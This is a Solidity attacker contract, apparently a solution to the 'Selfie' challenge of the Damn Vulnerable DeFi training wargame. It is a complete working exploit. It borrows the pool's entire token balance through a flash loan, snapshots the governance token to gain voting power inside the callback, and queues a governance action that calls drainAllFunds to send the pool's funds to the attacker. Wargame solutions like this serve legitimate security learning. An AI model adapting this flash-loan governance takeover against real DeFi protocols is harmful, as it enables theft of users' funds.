// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

/**
 * @title Simple - attacker
 *@author Valentin Staykov - https://github.com/Bludya/damn-vulnerable-def-solutions
 */

 contract SelfieAttacker {
    SimpleGovernance governance;
    SelfiePool pool;

    address owner;

    constructor(
        SimpleGovernance _governance,
        SelfiePool _pool
    ) {
        governance = _governance;
        pool = _pool;
        owner = msg.sender;
    }

    function attack(DamnValuableTokenSnapshot _token) external {
        uint256 amount = _token.balanceOf(address(pool));

        pool.flashLoan(amount);
    }

    function receiveTokens(DamnValuableTokenSnapshot _token, uint256 _amount) external {
        _token.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        governance.queueAction(address(pool), data, 0);

        _token.transfer(address(msg.sender), _amount);
    }
 }